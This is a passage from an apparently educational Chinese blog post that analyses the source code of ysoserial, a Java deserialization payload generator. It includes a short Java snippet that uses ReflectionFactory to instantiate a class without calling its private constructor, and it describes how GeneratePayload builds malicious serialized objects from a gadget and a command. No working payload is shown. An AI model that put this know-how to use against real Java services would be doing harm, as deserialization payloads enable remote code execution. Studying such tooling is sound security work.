<h3 id="ReflectionFactory"><a href="#ReflectionFactory" class="headerlink" title="ReflectionFactory"></a><code>ReflectionFactory</code></h3><p><code>ReflectionFactory</code> 是 Java 内部类，通常用于提供更底层的反射操作。</p>
<h3 id="newConstructorForSerialization"><a href="#newConstructorForSerialization" class="headerlink" title="newConstructorForSerialization"></a><code>newConstructorForSerialization</code></h3><p><code>newConstructorForSerialization</code> 方法用于创建一个特殊的构造函数，该构造函数可以用来实例化一个对象而不调用其常规构造函数。这个方法通常用于反序列化过程中，但在这里被用于绕过正常的构造函数调用。</p>
<h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>ReflectionFactory.getReflectionFactory()</code></strong>：获取 <code>ReflectionFactory</code> 的单例实例。</li>
<li><strong><code>newConstructorForSerialization(classToInstantiate, objCons)</code></strong>：</li>
<li><code>classToInstantiate</code>：要实例化的类，即目标类。</li>
<li><code>objCons</code>：一个构造函数对象，用于指定访问权限。例如，可以使用某个父类的无参构造函数来作为创建目标类实例的基础。</li>
<li>这个方法会返回一个 <code>Constructor</code> 对象，该对象是为序列化而创建的特殊构造函数。</li>
</ul>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ul>
<li><code>newConstructorForSerialization</code> 创建的构造函数具有以下特点：</li>
<li>它是一个特殊的构造函数，不会调用目标类的常规构造函数。</li>
<li>它可以实现实例化类对象的目的，即使常规构造函数是私有的或受保护的。</li>
<li>通常用于反序列化过程，但在这个上下文中被用于绕过访问限制。</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假设有一个类 <code>MyClass</code>，其构造函数是私有的或受保护的，通常情况下无法直接实例化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">MyClass</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="comment">// 私有构造函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>你可以使用 <code>ReflectionFactory</code> 来实例化这个类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;Class&lt;MyClass&gt; clazz = MyClass.class;</span><br><span class="line">&gt;Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();</span><br><span class="line">&gt;constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">&gt;Constructor&lt;?&gt; serializationConstructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);</span><br><span class="line">&gt;serializationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">&gt;<span class="type">MyClass</span> <span class="variable">instance</span> <span class="operator">=</span> (MyClass) serializationConstructor.newInstance();</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们通过 <code>ReflectionFactory</code> 创建了一个特殊的构造函数 <code>serializationConstructor</code>，它允许我们实例化 <code>MyClass</code> 的对象，而不调用其私有的常规构造函数。</p>
</blockquote>
<h4 id="ObjectPayload接口"><a href="#ObjectPayload接口" class="headerlink" title="ObjectPayload接口"></a>ObjectPayload接口</h4><p>这个接口是所有payload的父类，也就是链子具体实现的父类，接口本身没什么，不过它里面还有一个<code>Utils</code>的内部类，可以详细说说这个内部类中的各种方法。</p>
<h5 id="Utils-静态工具类"><a href="#Utils-静态工具类" class="headerlink" title="Utils 静态工具类"></a><code>Utils</code> 静态工具类</h5><ul>
<li><strong><code>getPayloadClasses</code> 方法</strong>：使用 <code>Reflections</code> 库扫描当前包及其子包，获取所有实现 <code>ObjectPayload</code> 接口的类，并过滤掉接口和抽象类。</li>
<li><strong><code>getPayloadClass</code> 方法</strong>：根据类名获取 <code>ObjectPayload</code> 的实现类。首先尝试直接加载类名，如果失败则尝试在 <code>payloads</code> 包下加载。</li>
<li><strong><code>makePayloadObject</code> 方法</strong>：根据 <code>payloadType</code> 和 <code>payloadArg</code> 创建并返回一个 payload 对象。</li>
<li><strong><code>releasePayload</code> 方法</strong>：释放 payload 对象。如果 <code>ObjectPayload</code> 实现了 <code>ReleaseableObjectPayload</code> 接口，则调用其 <code>release</code> 方法。</li>
</ul>
<h4 id="ReleaseableObjectPayload接口"><a href="#ReleaseableObjectPayload接口" class="headerlink" title="ReleaseableObjectPayload接口"></a>ReleaseableObjectPayload接口</h4><p>这个接口是用来和<code>releasePayload</code>方法配合使用，用来清理释放指定<code>Payload</code>的。</p>
<h3 id="secmgr包"><a href="#secmgr包" class="headerlink" title="secmgr包"></a>secmgr包</h3><p>这个包里面包含了两个<code>SecurityManager</code>的子类，用来更改安全检查的一些逻辑。</p>
<h4 id="DelegateSecurityManager类"><a href="#DelegateSecurityManager类" class="headerlink" title="DelegateSecurityManager类"></a>DelegateSecurityManager类</h4><p>继承了 Java 的 <code>SecurityManager</code> 类，并提供了一个委托机制，允许将安全管理任务委托给另一个 <code>SecurityManager</code> 实例。这个类的主要目的是在运行时动态地替换或增强现有的安全管理策略。它通过重写 <code>SecurityManager</code> 的许多方法，将这些方法的调用转发给内部持有的 <code>SecurityManager</code> 实例来实现这一点。此外，为了兼容 JDK 10 及以上版本，对一些已废弃的方法进行了处理，确保在调用这些方法时不会引发异常或错误。</p>
<h4 id="ExecCheckingSecurityManager类"><a href="#ExecCheckingSecurityManager类" class="headerlink" title="ExecCheckingSecurityManager类"></a>ExecCheckingSecurityManager类</h4><p>这个类同样继承自<code>SecurityManage</code>类，用来检查是否执行命令，并决定是否抛出异常。</p>
<h3 id="Deserializer类"><a href="#Deserializer类" class="headerlink" title="Deserializer类"></a>Deserializer类</h3><p>它负责将序列化的字节数组或输入流反序列化为 Java 对象。<code>Deserializer</code> 类实现了 <code>Callable&lt;Object&gt;</code> 接口，这意味着它可以在多线程环境中使用。可以提供一个字节数组给 <code>Deserializer</code> 实例，它会把这个字节数组转换成一个 Java 对象。主方法还允许从指定的文件或标准输入中读取序列化数据，并将其反序列化为对象。这段代码的核心功能是通过 <code>ObjectInputStream</code> 读取序列化的字节流并恢复成原始的 Java 对象。</p>
<h3 id="Serializer类"><a href="#Serializer类" class="headerlink" title="Serializer类"></a>Serializer类</h3><p>这个类封装了yso中经常使用的序列化操作，提供便捷，和上面的<code>Deserializer</code>类很相似。</p>
<h3 id="GeneratePayload类"><a href="#GeneratePayload类" class="headerlink" title="GeneratePayload类"></a>GeneratePayload类</h3><p>主要用于生成和序列化恶意的Java对象。该类通过命令行接收两个参数：一个payload类型和一个命令。它首先检查参数数量，如果不正确则打印使用说明并退出。然后，它根据提供的payload类型查找对应的 <code>ObjectPayload</code> 类，并尝试实例化该类以生成恶意对象。生成的对象随后被序列化并通过标准输出打印。如果过程中发生任何错误，程序会捕获异常并打印错误信息，然后退出并返回特定的错误代码。此外，<code>printUsage</code> 方法用于打印帮助信息，列出所有可用的payload类型及其作者和依赖项。</p>
<h3 id="Strings类"><a href="#Strings类" class="headerlink" title="Strings类"></a>Strings类</h3><p>这个类就是将一些常用的字符串方法进行一个封装，如连接，重复，格式化、比较操作。</p>
<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>springkill师傅的一张图</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20231112221509445.png" alt="image-20231112221509445"></p>
<p>由控制台进行输入，获取<code>gadget</code>和需要执行的命令传入到入口<code>GeneratePayload</code>中，然后由<code>GeneratePayload</code>调用具体的<code>ObjectPayload</code>接口的实现来获取实例，在这个过程中<code>ObjectPayload</code>又去调用了<code>Gadgets</code>、<code>Reflections</code>等进行初始化然后将对象返回给<code>GeneratePayload</code>，最后<code>GeneratePayload</code>调用<code>Serializer</code>的序列化方法将其序列化后返回并打印到控制台。</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">源码解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit%E5%8C%85"><span class="toc-number">1.1.</span> <span class="toc-text">exploit包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payloads%E5%8C%85"><span class="toc-number">1.2.</span> <span class="toc-text">payloads包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#annnotation%E5%8C%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">annnotation包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Authors%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Authors注解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Dependencies%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Dependencies注解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%A8%E8%A7%A3%E5%AE%9A%E4%B9%89"><span class="toc-number">1.3.</span> <span class="toc-text">1. 注解定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%E5%B1%9E%E6%80%A7%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">注解属性解析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.</span> <span class="toc-text">2. 工具类定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%B1%BB%E6%96%B9%E6%B3%95%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">工具类方法解析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.5.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PayloadTest%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">PayloadTest注解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%E5%AE%9A%E4%B9%89"><span class="toc-number">1.6.</span> <span class="toc-text">注解定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%E5%B1%9E%E6%80%A7%E8%A7%A3%E6%9E%90"><span class="toc-number">1.7.</span> <span class="toc-text">注解属性解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.8.</span> <span class="toc-text">使用示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Utils%E5%8C%85"><span class="toc-number">1.8.1.</span> <span class="toc-text">Utils包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ClassFiles%E7%B1%BB"><span class="toc-number">1.8.1.1.</span> <span class="toc-text">ClassFiles类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-classAsFile%E6%96%B9%E6%B3%95"><span class="toc-number">1.8.1.1.1.</span> <span class="toc-text">1. classAsFile方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-classAsBytes-%E6%96%B9%E6%B3%95"><span class="toc-number">1.8.1.1.2.</span> <span class="toc-text">2. classAsBytes 方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.1.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Gadgets%E7%B1%BB"><span class="toc-number">1.8.1.3.</span> <span class="toc-text">Gadgets类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97"><span class="toc-number">1.8.1.3.1.</span> <span class="toc-text">静态初始化块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E9%87%8F%E5%92%8C%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-number">1.8.1.3.2.</span> <span class="toc-text">常量和内部类</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E6%96%B9%E6%B3%95"><span class="toc-number">1.8.1.3.3.</span> <span class="toc-text">辅助方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JavaVersion%E7%B1%BB"><span class="toc-number">1.8.1.4.</span> <span class="toc-text">JavaVersion类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PayloadRunner%E7%B1%BB"><span class="toc-number">1.8.1.5.</span> <span class="toc-text">PayloadRunner类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Reflections%E7%B1%BB"><span class="toc-number">1.8.1.6.</span> <span class="toc-text">Reflections类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReflectionFactory"><span class="toc-number">1.9.</span> <span class="toc-text">ReflectionFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#newConstructorForSerialization"><span class="toc-number">1.10.</span> <span class="toc-text">newConstructorForSerialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A"><span class="toc-number">1.11.</span> <span class="toc-text">代码解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.12.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.13.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ObjectPayload%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.13.1.</span> <span class="toc-text">ObjectPayload接口</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Utils-%E9%9D%99%E6%80%81%E5%B7%A5%E5%85%B7%E7%B1%BB"><span class="toc-number">1.13.1.1.</span> <span class="toc-text">Utils 静态工具类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ReleaseableObjectPayload%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.13.2.</span> <span class="toc-text">ReleaseableObjectPayload接口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secmgr%E5%8C%85"><span class="toc-number">1.14.</span> <span class="toc-text">secmgr包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DelegateSecurityManager%E7%B1%BB"><span class="toc-number">1.14.1.</span> <span class="toc-text">DelegateSecurityManager类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ExecCheckingSecurityManager%E7%B1%BB"><span class="toc-number">1.14.2.</span> <span class="toc-text">ExecCheckingSecurityManager类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deserializer%E7%B1%BB"><span class="toc-number">1.15.</span> <span class="toc-text">Deserializer类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Serializer%E7%B1%BB"><span class="toc-number">1.16.</span> <span class="toc-text">Serializer类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GeneratePayload%E7%B1%BB"><span class="toc-number">1.17.</span> <span class="toc-text">GeneratePayload类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Strings%E7%B1%BB"><span class="toc-number">1.18.</span> <span class="toc-text">Strings类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.19.</span> <span class="toc-text">工作流程</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&text=ysoserial系列(1)——源码分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&is_video=false&description=ysoserial系列(1)——源码分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ysoserial系列(1)——源码分析&body=Check out this article: http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&name=ysoserial系列(1)——源码分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&t=ysoserial系列(1)——源码分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
